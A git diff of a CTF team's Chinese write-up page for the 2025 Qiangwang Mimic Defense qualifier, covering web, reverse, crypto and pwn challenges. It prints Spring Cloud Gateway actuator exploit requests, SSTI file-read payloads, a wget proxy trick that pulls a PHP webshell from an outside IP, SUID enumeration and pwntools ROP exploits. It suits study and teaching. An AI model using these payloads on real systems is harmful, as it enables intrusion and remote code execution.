@@ -2,7 +2,7 @@
 
 <!DOCTYPE html>
 <html lang="en" itemscope itemtype="http://schema.org/WebPage">
-  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <head>
     
 
   <meta charset="utf-8" />
@@ -14,7 +14,8 @@
 
       <title>第八届“强网”拟态防御国际精英挑战赛 SU Writeup - su-team</title>
 
-  <meta name="description" content="本次 强网拟态线上预选赛 我们 SU 取得了 第一名🏆 的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，欢迎发送个人简介至：suers_xctf@126.com 或者直接联系baozongwi QQ:2405758945。
+  <meta name="description" content="本次 强网拟态线上预选赛 我们 SU 取得了 第一名🏆 的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，欢迎发送个人简介至：suers_xctf@126.com
+ 或者直接联系baozongwi QQ:2405758945。
 以下是我们 SU 第八届“强网”拟态防御国际精英挑战赛 的 WriteUp。">
   <meta name="author" content="SUer"/><script type="application/ld+json">
 {
@@ -87,7 +88,8 @@
 
 
 <meta property="og:title" content="第八届“强网”拟态防御国际精英挑战赛 SU Writeup" />
-<meta property="og:description" content="本次 强网拟态线上预选赛 我们 SU 取得了 第一名🏆 的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，欢迎发送个人简介至：suers_xctf@126.com 或者直接联系baozongwi QQ:2405758945。
+<meta property="og:description" content="本次 强网拟态线上预选赛 我们 SU 取得了 第一名🏆 的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，欢迎发送个人简介至：suers_xctf@126.com
+ 或者直接联系baozongwi QQ:2405758945。
 以下是我们 SU 第八届“强网”拟态防御国际精英挑战赛 的 WriteUp。">
 <meta property="og:image" content="http://localhost:1313/img/SU.jpg" />
 <meta property="og:url" content="http://localhost:1313/post/ntfy-2025-su-wu/" />
@@ -95,7 +97,8 @@
 <meta property="og:site_name" content="su-team" />
 
   <meta name="twitter:title" content="第八届“强网”拟态防御国际精英挑战赛 SU Writeup" />
-  <meta name="twitter:description" content="本次 强网拟态线上预选赛 我们 SU 取得了 第一名🏆 的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，欢迎发送个人简介至：suers_xctf@126.com 或者直接联系baozongwi QQ:2405758945。
+  <meta name="twitter:description" content="本次 强网拟态线上预选赛 我们 SU 取得了 第一名🏆 的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，欢迎发送个人简介至：suers_xctf@126.com
+ 或者直接联系baozongwi QQ:2405758945。
 以下是我们 SU 第八届“强网”拟态防御国际精英挑战赛 的 WriteUp。">
   <meta name="twitter:image" content="http://localhost:1313/img/SU.jpg" />
   <meta name="twitter:card" content="summary_large_image" />
@@ -412,13 +415,16 @@
 
         <section class="article-shell">
           <article role="main" class="blog-post">
-            <p>本次 强网拟态线上预选赛 我们 SU 取得了 第一名🏆 的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，欢迎发送个人简介至：<a href="mailto:suers_xctf@126.com">suers_xctf@126.com</a> 或者直接联系baozongwi QQ:2405758945。</p>
+            <p>本次 强网拟态线上预选赛 我们 SU 取得了 第一名🏆 的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，欢迎发送个人简介至：<a href="mailto:suers_xctf@126.com">suers_xctf@126.com</a>
+ 或者直接联系baozongwi QQ:2405758945。</p>
 <p>以下是我们 SU 第八届“强网”拟态防御国际精英挑战赛 的 WriteUp。</p>
 <h1 id="web">Web</h1>
 <h2 id="ezcloud">Ezcloud</h2>
-<p>最开始是找到了 <a href="https://blog.csdn.net/guo15890025019/article/details/129503346">https://blog.csdn.net/guo15890025019/article/details/129503346</a></p>
+<p>最开始是找到了 <a href="https://blog.csdn.net/guo15890025019/article/details/129503346">https://blog.csdn.net/guo15890025019/article/details/129503346</a>
+</p>
 <p>但是复现怎么都不成功，创建路由前面都是对的，然后找有没得Bypass，找到这个</p>
-<p><a href="https://rce.moe/2025/09/29/CVE-2025-41243">https://rce.moe/2025/09/29/CVE-2025-41243</a> 正好解决我的问题，直接开干</p>
+<p><a href="https://rce.moe/2025/09/29/CVE-2025-41243">https://rce.moe/2025/09/29/CVE-2025-41243</a>
+ 正好解决我的问题，直接开干</p>
 <p>通过bean map 禁用安全限制，然后刷新路由、添加路由</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-HTTP" data-lang="HTTP"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/actuator/gateway/routes/step1</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
 </span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">web-632dc679bf.challenge.xctf.org.cn:80</span>
@@ -505,12 +511,27 @@
 </span></span><span class="line"><span class="cl">  <span class="p">}]</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></div><p>然后访问 /webjars/flag 就能获得 flag，虽然最后是 404 但是不影响</p>
-<p><img src="/img/2025-QWNT/1.png" alt="img"></p>
+<p><img
+  src="/post/ntfy-2025-su-wu/1.png"
+  alt="img"
+  loading="lazy"
+>
+</p>
 <h2 id="safesecret">safesecret</h2>
 <p>漏洞点在这里的ssti</p>
-<p><img src="/img/2025-QWNT/2.png" alt="img"></p>
+<p><img
+  src="/post/ntfy-2025-su-wu/2.png"
+  alt="img"
+  loading="lazy"
+>
+</p>
 <p>获取secret, 这里需要ssrf</p>
-<p><img src="/img/2025-QWNT/3.png" alt="img"></p>
+<p><img
+  src="/post/ntfy-2025-su-wu/3.png"
+  alt="img"
+  loading="lazy"
+>
+</p>
 <p>这一步可以直接ai问出来</p>
 <p>exploit_server.py:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">http.server</span> <span class="kn">import</span> <span class="n">BaseHTTPRequestHandler</span><span class="p">,</span> <span class="n">HTTPServer</span>
@@ -546,7 +567,12 @@
 </span></span></code></pre></div><p>题目把sset和sget注册到了app.jinja_env.globals中, 这使得我们可以在payload中直接使用这两个函数, 并且可以通过类似<code>sset.__globals__</code>拿到它的__globals__</p>
 <p>并且题目有一个read函数</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">read</span><span class="p">(</span><span class="n">f</span><span class="p">):</span> <span class="k">return</span> <span class="nb">open</span><span class="p">(</span><span class="n">f</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
-</span></span></code></pre></div><p><img src="/img/2025-QWNT/4.png" alt="img"></p>
+</span></span></code></pre></div><p><img
+  src="/post/ntfy-2025-su-wu/4.png"
+  alt="img"
+  loading="lazy"
+>
+</p>
 <p>我们可以从<code>sset.__globals__</code>直接获取到, 并且也可以直接使用sset把某些字符串存进session</p>
 <p>最终构造出以下payload</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Bash" data-lang="Bash"><span class="line"><span class="cl"><span class="o">{</span>% print<span class="o">(</span>sset<span class="o">(</span><span class="s1">&#39;g&#39;</span>,request.args.a<span class="o">))</span> %<span class="o">}</span><span class="p">&amp;</span><span class="nv">a</span><span class="o">=</span>__globals__
@@ -554,7 +580,8 @@
 </span></span><span class="line"><span class="cl"><span class="o">{</span>%print<span class="o">(</span>sset<span class="o">[</span>sget<span class="o">(</span><span class="s1">&#39;g&#39;</span><span class="o">)][</span><span class="s1">&#39;rea&#39;&#39;d&#39;</span><span class="o">](</span>sget<span class="o">(</span><span class="s1">&#39;f&#39;</span><span class="o">)))</span>%<span class="o">}</span>
 </span></span></code></pre></div><p>分三次执行即可</p>
 <h2 id="smallcode">smallcode</h2>
-<p>参考：<a href="https://yenannn.github.io/2022/05/30/startctf%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%B3%A8%E5%85%A5%E7%9A%84%E6%94%B9%E7%BC%96/">startctf环境变量注入的改编</a></p>
+<p>参考：<a href="https://yenannn.github.io/2022/05/30/startctf%e7%8e%af%e5%a2%83%e5%8f%98%e9%87%8f%e6%b3%a8%e5%85%a5%e7%9a%84%e6%94%b9%e7%bc%96/">startctf环境变量注入的改编</a>
+</p>
 <p>原题直接，wp照着复现一遍</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Bash" data-lang="Bash"><span class="line"><span class="cl"><span class="nv">http_proxy</span><span class="o">=</span>156.238.233.111:5566
 </span></span><span class="line"><span class="cl"><span class="nv">output_document</span><span class="o">=</span>/var/www/html/shell.php
@@ -581,13 +608,33 @@
 </span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">debug</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">host</span><span class="o">=</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">5566</span><span class="p">)</span>
 </span></span></code></pre></div><p>这时候输入</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Bash" data-lang="Bash"><span class="line"><span class="cl"><span class="nv">env</span><span class="o">=</span><span class="nv">WGETRC</span><span class="o">=</span>/var/www/html/1.txt
-</span></span></code></pre></div><p><img src="/img/2025-QWNT/5.png" alt="img"></p>
-<p><img src="/img/2025-QWNT/6.png" alt="img"></p>
+</span></span></code></pre></div><p><img
+  src="/post/ntfy-2025-su-wu/5.png"
+  alt="img"
+  loading="lazy"
+>
+</p>
+<p><img
+  src="/post/ntfy-2025-su-wu/6.png"
+  alt="img"
+  loading="lazy"
+>
+</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Bash" data-lang="Bash"><span class="line"><span class="cl">find / -perm -4000 -type f -exec ls -la <span class="o">{}</span> 2&gt;/dev/null <span class="se">\;</span>
-</span></span></code></pre></div><p><img src="/img/2025-QWNT/7.png" alt="img"></p>
+</span></span></code></pre></div><p><img
+  src="/post/ntfy-2025-su-wu/7.png"
+  alt="img"
+  loading="lazy"
+>
+</p>
 <h2 id="ecshop">ecshop</h2>
 <p>不告诉你，这个就是很 ez，自己审代码去吧</p>
-<p><img src="/img/2025-QWNT/19.png" alt="img"></p>
+<p><img
+  src="/post/ntfy-2025-su-wu/19.png"
+  alt="img"
+  loading="lazy"
+>
+</p>
 <h1 id="reverse">Reverse</h1>
 <h2 id="hyperjump">HyperJump</h2>
 <p>Vm逻辑太复杂不想看，发现函数是单字节加密（每次比较一个字节），因此直接pintool爆破了，因为错误会提前退出，导致指令执行数目大大减少</p>
@@ -680,19 +727,59 @@
 <h2 id="icall">Icall</h2>
 <p>地址混淆+控制流平坦化，不会还原只能上动调</p>
 <p>首先init里出现了pthread_create创建新线程导致调试器附加失败（反调），因此直接跳过pthread_create的调用（IDA来set ip），接着跳过exit的调用</p>
-<p><img src="/img/2025-QWNT/20.png" alt="img"></p>
-<p><img src="/img/2025-QWNT/21.png" alt="img"></p>
+<p><img
+  src="/post/ntfy-2025-su-wu/20.png"
+  alt="img"
+  loading="lazy"
+>
+</p>
+<p><img
+  src="/post/ntfy-2025-su-wu/21.png"
+  alt="img"
+  loading="lazy"
+>
+</p>
 <p>接着就可以F9来到main一点点调试，首先关注到解密出来了一个字符串&quot;arf@gocrying&quot;</p>
-<p><img src="/img/2025-QWNT/22.png" alt="img"></p>
+<p><img
+  src="/post/ntfy-2025-su-wu/22.png"
+  alt="img"
+  loading="lazy"
+>
+</p>
 <p>然后输入字符串</p>
-<p><img src="/img/2025-QWNT/23.png" alt="img"></p>
+<p><img
+  src="/post/ntfy-2025-su-wu/23.png"
+  alt="img"
+  loading="lazy"
+>
+</p>
 <p>然后循环做了放射处理</p>
-<p><img src="/img/2025-QWNT/24.png" alt="img"></p>
+<p><img
+  src="/post/ntfy-2025-su-wu/24.png"
+  alt="img"
+  loading="lazy"
+>
+</p>
 <p>接着就是RC4，观察到了init和异或，同时该流程调用了三次</p>
-<p><img src="/img/2025-QWNT/25.png" alt="img"></p>
-<p><img src="/img/2025-QWNT/26.png" alt="img"></p>
+<p><img
+  src="/post/ntfy-2025-su-wu/25.png"
+  alt="img"
+  loading="lazy"
+>
+</p>
+<p><img
+  src="/post/ntfy-2025-su-wu/26.png"
+  alt="img"
+  loading="lazy"
+>
+</p>
 <p>由于一直没复现出来，所以直接下条件断点提取异或值</p>
-<p><img src="/img/2025-QWNT/27.png" alt="img"></p>
+<p><img
+  src="/post/ntfy-2025-su-wu/27.png"
+  alt="img"
+  loading="lazy"
+>
+</p>
 <p>提取出来异或的v10（keystream，正好是90个，也就是每次加密30个字符）</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="s2">&#34;&#34;&#34;108 91
 </span></span></span><span class="line"><span class="cl"><span class="s2">55 205
@@ -998,15 +1085,35 @@
 </span></span></code></pre></div><p>得到flag：flag{JustEasyMiniProgram}</p>
 <h2 id="just">Just</h2>
 <p>il2cpp的加固，思考如何解密il2cpp.so</p>
-<p><img src="/img/2025-QWNT/28.png" alt="img"></p>
+<p><img
+  src="/post/ntfy-2025-su-wu/28.png"
+  alt="img"
+  loading="lazy"
+>
+</p>
 <p>UnityPlayerActivity中载入了just.so，后续不再有任何JNI调用，说明利用了构造函数或者Jni_onload</p>
 <p>Just.so Hook了dlopen解密il2cpp.so</p>
-<p><img src="/img/2025-QWNT/29.png" alt="img"></p>
+<p><img
+  src="/post/ntfy-2025-su-wu/29.png"
+  alt="img"
+  loading="lazy"
+>
+</p>
 <p>可以看到解密逻辑是RC4+^0x33</p>
 <p>密钥在上文中是nihaounity</p>
-<p><img src="/img/2025-QWNT/30.png" alt="img"></p>
+<p><img
+  src="/post/ntfy-2025-su-wu/30.png"
+  alt="img"
+  loading="lazy"
+>
+</p>
 <p>解密到so文件，直接尝试il2cppdumper是失败的，发现metadata也被加密了，metadata是在il2cpp.so中进行加密的</p>
-<p><img src="/img/2025-QWNT/31.png" alt="img"></p>
+<p><img
+  src="/post/ntfy-2025-su-wu/31.png"
+  alt="img"
+  loading="lazy"
+>
+</p>
 <p>看到加密逻辑，这里直接解密</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
 </span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span><span class="o">,</span> <span class="nn">struct</span>
@@ -1027,14 +1134,39 @@
 </span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
 </span></span><span class="line"><span class="cl">    <span class="n">decrypt</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
 </span></span></code></pre></div><p>接下来il2cppdumper直接恢复符号了</p>
-<p><img src="/img/2025-QWNT/32.png" alt="img"></p>
-<p><img src="/img/2025-QWNT/33.png" alt="img"></p>
+<p><img
+  src="/post/ntfy-2025-su-wu/32.png"
+  alt="img"
+  loading="lazy"
+>
+</p>
+<p><img
+  src="/post/ntfy-2025-su-wu/33.png"
+  alt="img"
+  loading="lazy"
+>
+</p>
 <p>TEA轮子没有任何魔改，就是tea加密自身之后再进行异或，引入流密码特性</p>
-<p><img src="/img/2025-QWNT/34.png" alt="img"></p>
+<p><img
+  src="/post/ntfy-2025-su-wu/34.png"
+  alt="img"
+  loading="lazy"
+>
+</p>
 <p>根据PrivateImplementationDetails的特性，构造函数的这个内容是通过dump.cs找偏移在global-metadata中取值</p>
-<p><img src="/img/2025-QWNT/35.png" alt="img"></p>
+<p><img
+  src="/post/ntfy-2025-su-wu/35.png"
+  alt="img"
+  loading="lazy"
+>
+</p>
 <p>根据偏移索引地址</p>
-<p><img src="/img/2025-QWNT/36.png" alt="img"></p>
+<p><img
+  src="/post/ntfy-2025-su-wu/36.png"
+  alt="img"
+  loading="lazy"
+>
+</p>
 <p>即可找到密文密钥</p>
 <p>根据tea特性4个uint为密钥，40bytes自然是密文</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">struct</span>
@@ -1094,7 +1226,8 @@
 </span></span></code></pre></div><h1 id="crypto">Crypto</h1>
 <h2 id="unsafe-parameters">Unsafe Parameters</h2>
 <p>多因子共私钥攻击，按照这篇论文去打</p>
-<p><a href="http://ijeie.jalaxy.com.tw/contents/ijeie-v7-n2/ijeie-2017-v7-n2-p79-87.pdf">http://ijeie.jalaxy.com.tw/contents/ijeie-v7-n2/ijeie-2017-v7-n2-p79-87.pdf</a></p>
+<p><a href="http://ijeie.jalaxy.com.tw/contents/ijeie-v7-n2/ijeie-2017-v7-n2-p79-87.pdf">http://ijeie.jalaxy.com.tw/contents/ijeie-v7-n2/ijeie-2017-v7-n2-p79-87.pdf</a>
+</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="o">*</span>
 </span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">gmpy2</span>
 </span></span><span class="line"><span class="cl">
@@ -1570,11 +1703,21 @@ $$Y_{n+1} = [(aX_n + b) \mod p] \mod 256$$
 </span></span><span class="line"><span class="cl">        <span class="n">send_guess</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">([</span><span class="kc">True</span><span class="p">,</span> <span class="kc">False</span><span class="p">]))</span>
 </span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
 </span></span><span class="line"><span class="cl">        <span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
-</span></span></code></pre></div><p><img src="/img/2025-QWNT/37.png" alt="img"></p>
+</span></span></code></pre></div><p><img
+  src="/post/ntfy-2025-su-wu/37.png"
+  alt="img"
+  loading="lazy"
+>
+</p>
 <p>拿到密文是</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Plain" data-lang="Plain"><span class="line"><span class="cl">buiqhrvilHwigdClBuiTucduZnXmrLoHleieggbawsgsgcAyaFekhqWmAvqTocwhBuiiARfyurergyhNprwePcHcurmQsmGmqopirdhliaWpdRwIvhRphqgNproiBgGevBaRwfsyifiAlRvQpvglwfsemLQeBzswpnrkhbwmiAsXkcFjWvrXlLtuDbVsiRvyiqStWgcHwsxlLqqilrfCwfCmmqiWlPwhogSxuybMuvXmPncLbnrxPcGmitiWzgHbWhxXkcgfQtlxhQhxiakiUmtNprmvPcGmitiWecWhoeiegzMjWymxlaofwefyVgbyaFvmYyzmmGg
 </span></span></code></pre></div><p>用在线网站爆破密钥</p>
-<p><img src="/img/2025-QWNT/38.png" alt="img"></p>
+<p><img
+  src="/post/ntfy-2025-su-wu/38.png"
+  alt="img"
+  loading="lazy"
+>
+</p>
 <blockquote>
 <p>flag{ineedyou}</p>
 </blockquote>
@@ -1584,16 +1727,31 @@ $$Y_{n+1} = [(aX_n + b) \mod p] \mod 256$$
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Bash" data-lang="Bash"><span class="line"><span class="cl">5qC45b+D5Luj56CB5oiR5bey5bCG5YW25pS+6L+b5LqGZm9ya+eahOengeS6uuS7k+W6k+mHjA<span class="o">==</span>
 </span></span><span class="line"><span class="cl">核心代码我已将其放进了fork的私人仓库里
 </span></span></code></pre></div><p>去github上查找对应的项目，给出了app的基本代码，去commit发现账户对应的用户和密码要求</p>
-<p><img src="/img/2025-QWNT/39.png" alt="img"></p>
+<p><img
+  src="/post/ntfy-2025-su-wu/39.png"
+  alt="img"
+  loading="lazy"
+>
+</p>
 <p>在issue里提到了qq，简单处理得到</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Bash" data-lang="Bash"><span class="line"><span class="cl">3517508570@qq.com
 </span></span><span class="line"><span class="cl">f42e16b836b22e83fd3818b603c75dc6
 </span></span></code></pre></div><p>进去发现有个历史存档的信息，需要尝试解密，根据一开始的提示，需要爆破一下隐藏的commit拿到加密的代码</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Bash" data-lang="Bash"><span class="line"><span class="cl">EXPORT <span class="nv">GITHUB_TOKEN</span><span class="o">=</span>ghp_Jk...
 </span></span><span class="line"><span class="cl">./trufflehog github-experimental --repo https://github.com/Yu2ul0ver/Ciallo_Encrypt0r.git --object-discovery
-</span></span></code></pre></div><p><img src="/img/2025-QWNT/40.png" alt="img"></p>
+</span></span></code></pre></div><p><img
+  src="/post/ntfy-2025-su-wu/40.png"
+  alt="img"
+  loading="lazy"
+>
+</p>
 <p>随机访问一个拿到加密逻辑</p>
-<p><img src="/img/2025-QWNT/41.png" alt="img"></p>
+<p><img
+  src="/post/ntfy-2025-su-wu/41.png"
+  alt="img"
+  loading="lazy"
+>
+</p>
 <p>带上密文和时间戳给ai写解密脚本</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
 </span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Util.Padding</span> <span class="kn">import</span> <span class="n">unpad</span>
@@ -1702,7 +1860,12 @@ $$Y_{n+1} = [(aX_n + b) \mod p] \mod 256$$
 </span></span></code></pre></div><h1 id="低空经济网络安全">低空经济网络安全</h1>
 <h2 id="the-hidden-link">The Hidden Link</h2>
 <p>全是udp的流量，wirkshark简单的手动分析一下在</p>
-<p><img src="/img/2025-QWNT/42.png" alt="img"></p>
+<p><img
+  src="/post/ntfy-2025-su-wu/42.png"
+  alt="img"
+  loading="lazy"
+>
+</p>
 <p>类似这样B后面有明文，且刚好能拼成正常的flag的内容，手动补填一下</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Bash" data-lang="Bash"><span class="line"><span class="cl">...Bk3d<span class="o">}</span>.
 </span></span><span class="line"><span class="cl">...Bll3r.
@@ -1717,15 +1880,35 @@ $$Y_{n+1} = [(aX_n + b) \mod p] \mod 256$$
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Bash" data-lang="Bash"><span class="line"><span class="cl">flag<span class="o">{</span>dr0n3_fl1ght_c0ntr0ll3r_h4ck3d<span class="o">}</span>
 </span></span></code></pre></div><h1 id="pwn">Pwn</h1>
 <h2 id="stack">stack</h2>
-<p><img src="/img/2025-QWNT/43.png" alt="img"></p>
-<p><img src="/img/2025-QWNT/44.png" alt="img"></p>
+<p><img
+  src="/post/ntfy-2025-su-wu/43.png"
+  alt="img"
+  loading="lazy"
+>
+</p>
+<p><img
+  src="/post/ntfy-2025-su-wu/44.png"
+  alt="img"
+  loading="lazy"
+>
+</p>
 <p>sub_401354控制好输入可以泄漏rbp的栈地址。</p>
 <p>sub_4013B9存在大量栈溢出。</p>
 <p>在sub_4013B9中调试发现栈上存在libc地址：</p>
-<p><img src="/img/2025-QWNT/45.png" alt="img"></p>
+<p><img
+  src="/post/ntfy-2025-su-wu/45.png"
+  alt="img"
+  loading="lazy"
+>
+</p>
 <p>我们可以通过合理控制rbp回到sub_401354来泄漏libc地址0x75ae10429d90然后顺便回到main函数0x401413，但是这样下一次printf会出现栈对齐问题，所以我们需要栈迁移一次避免调用main函数，而是直接调用sub_401354的read部分。</p>
 <p>这样通过合理构造rbp完成栈上的栈迁移，通过sub_401354自带的printf将libc打印出来，然后接上一个sub_4013B9的read部分，再绕开沙盒执行orw即可获得flag：</p>
-<p><img src="/img/2025-QWNT/46.png" alt="img"></p>
+<p><img
+  src="/post/ntfy-2025-su-wu/46.png"
+  alt="img"
+  loading="lazy"
+>
+</p>
 <p>exp：</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 </span></span><span class="line"><span class="cl"><span class="c1">#from ctypes import *</span>
@@ -1829,10 +2012,20 @@ $$Y_{n+1} = [(aX_n + b) \mod p] \mod 256$$
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">op</span><span class="p">()</span>
 </span></span></code></pre></div><p>flag：</p>
-<p><img src="/img/2025-QWNT/47.png" alt="img"></p>
+<p><img
+  src="/post/ntfy-2025-su-wu/47.png"
+  alt="img"
+  loading="lazy"
+>
+</p>
 <h2 id="pinnote">PinNote</h2>
 <p>看了一圈没看出问题，直到测这个 tmp/pin* 文件</p>
-<p><img src="/img/2025-QWNT/48.png" alt="img"></p>
+<p><img
+  src="/post/ntfy-2025-su-wu/48.png"
+  alt="img"
+  loading="lazy"
+>
+</p>
 <p>如果两个进程同时指向一个文件，就可以篡改size,</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 </span></span><span class="line"><span class="cl"><span class="c1">#from ctypes import CDLL</span>
@@ -2202,7 +2395,12 @@ $$Y_{n+1} = [(aX_n + b) \mod p] \mod 256$$
 </span></span><span class="line"><span class="cl"><span class="n">itr</span><span class="p">()</span>
 </span></span></code></pre></div><h2 id="babystack">babystack</h2>
 <p>程序逻辑如下，可以通过第二次输入将n180097847覆盖，然后直接getshell</p>
-<p><img src="/img/2025-QWNT/49.png" alt="img"></p>
+<p><img
+  src="/post/ntfy-2025-su-wu/49.png"
+  alt="img"
+  loading="lazy"
+>
+</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 </span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">ctypes</span> <span class="kn">import</span> <span class="o">*</span>
 </span></span><span class="line"><span class="cl">
@@ -2261,7 +2459,12 @@ $$Y_{n+1} = [(aX_n + b) \mod p] \mod 256$$
 </span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="nt">0007</span><span class="p">:</span><span class="w"> </span><span class="m">0x06</span><span class="w"> </span><span class="m">0x00</span><span class="w"> </span><span class="m">0x00</span><span class="w"> </span><span class="m">0x7fff0000</span><span class="w">  </span><span class="l">return ALLOW</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="nt">0008</span><span class="p">:</span><span class="w"> </span><span class="m">0x06</span><span class="w"> </span><span class="m">0x00</span><span class="w"> </span><span class="m">0x00</span><span class="w"> </span><span class="m">0x00000000</span><span class="w">  </span><span class="l">return KILL</span><span class="w">
 </span></span></span></code></pre></div><p>大概分析一下逻辑，先是一个密码</p>
-<p><img src="/img/2025-QWNT/50.png" alt="img"></p>
+<p><img
+  src="/post/ntfy-2025-su-wu/50.png"
+  alt="img"
+  loading="lazy"
+>
+</p>
 <p>然后可以输入指令，但这上面这几个指令都没什么用。主要是下面的逻辑，我们可以发送3种类型的 ISO-TP 帧</p>
 <ul>
 <li>SF - 单帧</li>
@@ -2277,7 +2480,12 @@ $$Y_{n+1} = [(aX_n + b) \mod p] \mod 256$$
 </li>
 </ul>
 <p>大概尝试了一下，可以利用处理 CF 帧的这个 if 判断来泄露 pie</p>
-<p><img src="/img/2025-QWNT/51.png" alt="img"></p>
+<p><img
+  src="/post/ntfy-2025-su-wu/51.png"
+  alt="img"
+  loading="lazy"
+>
+</p>
 <p>没细看处理的逻辑，但大概尝试了一下</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-SQL" data-lang="SQL"><span class="line"><span class="cl"><span class="n">sla</span><span class="p">(</span><span class="s1">&#39;Enter magic number:\n&#39;</span><span class="p">,</span><span class="s1">&#39;12803159&#39;</span><span class="p">)</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="n">sla</span><span class="p">(</span><span class="s1">&#39;&gt;&#39;</span><span class="p">,</span><span class="s1">&#39;1#1020414141414141&#39;</span><span class="p">)</span><span class="w">
@@ -2288,9 +2496,19 @@ $$Y_{n+1} = [(aX_n + b) \mod p] \mod 256$$
 </span></span></span><span class="line"><span class="cl"><span class="n">sla</span><span class="p">(</span><span class="s1">&#39;&gt;&#39;</span><span class="p">,</span><span class="s1">&#39;1#2445454545454545&#39;</span><span class="p">)</span><span class="w">
 </span></span></span></code></pre></div><p>就能执行到这个else分支，应该是输入的 CF 帧不合法导致的</p>
 <p>值得注意的是这个函数</p>
-<p><img src="/img/2025-QWNT/52.png" alt="img"></p>
+<p><img
+  src="/post/ntfy-2025-su-wu/52.png"
+  alt="img"
+  loading="lazy"
+>
+</p>
 <p>memcpy没有对长度进行判断，当满足条件的时候就会执行下面这个 p_sub_16E0, 存放在 buf_ + 0x100 的位置</p>
-<p><img src="/img/2025-QWNT/53.png" alt="img"></p>
+<p><img
+  src="/post/ntfy-2025-su-wu/53.png"
+  alt="img"
+  loading="lazy"
+>
+</p>
 <p>可以先发送一个 FF 帧，例如：发送 <code>1#1008...</code>, 发这个帧是为了设定 ::n 的大小 , 由1#1后面的三个数字来决定，这个例子中  ::n 会被设定为 8。</p>
 <p>泄露出 pie_base 之后需要重新设置 FF 帧，把ret写到开头，接着就利用 CF 帧的memcpy布置rop链来泄露libc。这里rop链的结构是</p>
